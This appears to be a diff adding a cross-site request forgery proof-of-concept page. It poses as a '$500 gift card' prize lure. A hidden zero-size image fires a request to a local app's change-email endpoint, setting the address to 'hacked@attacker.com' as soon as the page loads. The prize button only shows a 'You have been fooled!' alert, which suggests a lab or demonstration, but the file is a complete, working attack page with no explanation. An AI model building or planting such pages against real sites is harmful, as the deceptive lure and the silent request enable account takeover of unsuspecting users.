@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>You've won a prize</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #ffedb1;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 48px 40px;
+      max-width: 480px;
+      text-align: center;
+    }
+
+    .emoji { font-size: 64px; margin-bottom: 16px; }
+
+    h1 {
+      font-size: 28px;
+      color: #222;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 15px;
+      color: #555;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .btn {
+      display: inline-block;
+      background: #f0c040;
+      color: #222;
+      font-size: 16px;
+      font-weight: 700;
+      padding: 14px 36px;
+      border-radius: 6px;
+      text-decoration: none;
+      cursor: pointer;
+      border: none;
+    }
+
+    .fine-print {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #bbb;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="emoji">🎉</div>
+    <h1>Congratulations!</h1>
+    <p>
+      You have been selected as today's lucky winner.<br/>
+      Click the button below to claim your <strong>$500 gift card</strong>, no signup required!
+    </p>
+    <button class="btn" onclick="claim()">Claim My Prize</button>
+    <p class="fine-print">Limited time offer. By clicking you agree to our terms.</p>
+  </div>
+
+  <img
+    src="http://localhost:3000/api/change-email?email=hacked@attacker.com"
+    width="0"
+    height="0"
+    style="display:none"
+    alt=""
+  />
+
+  <script>
+    function claim() {
+      alert("You have been fooled!");
+    }
+  </script>
+
+</body>
+</html>
